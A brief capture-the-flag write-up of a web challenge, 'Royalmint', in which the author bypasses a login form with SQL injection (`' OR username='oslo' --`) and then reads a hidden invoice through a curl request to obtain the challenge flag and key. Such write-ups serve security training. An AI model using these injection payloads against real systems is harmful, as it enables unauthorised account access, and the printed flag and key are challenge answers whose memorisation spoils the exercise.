## Web 01 Royalmint
description: Behind a public memorial page, Denver brute-forces directories and finds deleted policy documents explaining how A₀ automates digital manipulation. This is proof the AI exists.

the website had a login page which had a SQL injection vulnerability, when you login with a single `'` as username and anything as password, you get back all the users, they are oslo, Raquel and helsinki. 

you can log into oslo's account using the SQL Injection payload `' OR username='oslo' --` and anything as password, what you see there is a number of invoices starting from 1001. 

at this point i thought of inspecting the page's source code for any leads, i go to the source tab in the inspect element and searched for the word admin in the rendered source code and found out that the flag and the key will be made available when i visit the invoice number `1057`

i went to the invoice 1057 using the format curl request

    curl 'http://10.60.0.25:5001/invoices/1057?format=json' \
      -H 'Accept: */*' \
      -H 'Accept-Language: en-US,en;q=0.9' \
      -H 'Connection: keep-alive' \
      -b 'connect.sid=s%3AHV0LPGBGjiz5rhsCKhTEwkIJglhO4Lvd.RXLVjPKEn8vI20btBRYbSrk%2BhHJGeN30MTOBzFwbvQw' \
      -H 'If-None-Match: W/"5d-zlaAYZikJr/txRp8e8j/OycR4RQ"' \
      -H 'Referer: http://10.60.0.25:5001/' \
      -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' \
      --insecure


  and found the flag and the key

  KEY: `d2ce4d95af6465a5a2ea7f4d5e16c84580d4858abdb5b4544db7e0e41950cd2f`
  FLAG: `TDHCTF{DENVER_LAUGHS_AT_BROKEN_ACL}`

  